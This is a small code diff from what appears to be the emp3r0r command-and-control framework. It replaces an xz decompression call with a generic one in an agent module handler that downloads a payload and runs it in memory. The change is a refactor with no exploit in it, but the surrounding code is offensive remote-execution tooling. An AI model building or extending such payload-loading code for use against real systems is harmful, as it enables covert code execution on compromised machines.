@@ -7,7 +7,6 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
-	"github.com/jm33-m0/arc/v2"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -27,7 +26,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 		return downloadErr.Error()
 	}
 	// in memory execution
-	payload_data, err := arc.DecompressXz(payload_data_downloaded)
+	payload_data, err := util.Decompress(payload_data_downloaded)
 	if err != nil {
 		return logging.Sprintf("decompressing %s: %v", file_to_download, err)
 	}
